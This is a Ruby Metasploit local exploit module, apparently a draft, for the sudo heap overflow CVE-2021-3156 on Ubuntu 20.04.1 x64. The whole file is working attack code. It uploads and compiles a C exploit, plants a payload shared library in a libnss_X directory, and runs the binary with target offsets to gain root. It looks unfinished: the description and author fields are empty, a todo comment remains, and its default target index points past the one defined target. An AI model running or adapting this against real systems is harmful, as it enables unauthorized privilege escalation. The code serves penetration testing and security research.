##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Sudo',
        'Description'    => %q(

        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [

          ],
        'Platform'       => ['unix', 'linux'],
        'Targets'        =>
          [
            [
              'Ubuntu 20.04.1 x64',
              {
                path: '/usr/bin/sudoedit',
                offseta: 56,
                offsetb: 54,
                offsetc: 63,
                offsetd: 200
              }
            ],
          ],
        'DefaultTarget'  => 1,
        'Arch'           => ARCH_X64,
        'DefaultOptions' => { 'WfsDelay' => 15 },
        'DisclosureDate' => '2021-01-26'
      # todo: add the AKA samedit and references
      )
    )

    register_options(
      [
        OptString.new('WritableDir', [ true, 'A directory where you can write files.', '/tmp' ])
      ], self.class
    )
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    write_file path, data
  end

  def upload_and_compile(path, data)
    upload "#{path}.c", data
    gcc_cmd = "gcc -o #{path} #{path}.c"
    if session.type.eql? 'shell'
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end

    output = cmd_exec gcc_cmd
    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    cmd_exec "chmod +x #{path}"
  end

  def exploit
    print_status("Starting the exploit")
    path = datastore['WritableDir']
    cmd_exec("mkdir -p #{path}/libnss_X")

    file_name = rand_text_alphanumeric rand(5..10)
    upload_and_compile("#{path}/#{file_name}", ::File.binread(::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-3156', 'exploit.c')))

    upload("#{path}/libnss_X/P0P_SH3LLZ_ .so.2", generate_payload_dll)

    # run the exploit binary
    output = cmd_exec("#{path}/#{file_name} #{target[:offseta]} #{target[:offsetb]} #{target[:offsetc]} #{target[:offsetd]}")
    print_line(output)
  end
end
